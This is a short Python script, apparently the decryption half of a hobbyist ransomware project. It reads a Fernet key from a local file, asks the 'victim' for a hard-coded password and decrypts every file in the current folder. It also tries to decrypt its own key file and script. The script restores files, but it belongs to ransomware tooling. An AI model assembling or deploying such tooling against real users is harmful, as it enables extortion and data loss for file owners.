#dencrypted the files

import os
from cryptography.fernet import Fernet

files=[]

for i in os.listdir():
    if os.path.isfile(i):
        files.append(i)

print(files)

with open ("key.key","rb") as k:
    seckey =k.read()

secf="password"
victam= input("enter the password to decrypt your files")


if victam==secf:
    for i in files:
        with open(i,"rb") as f1:
            stuff=f1.read()
        stuff_decrypted=Fernet(seckey).decrypt(stuff)
        with open(i,"wb") as f1:
            f1.write(stuff_decrypted)
        print("decrypted")
else:
    print("wrong password still encrypted")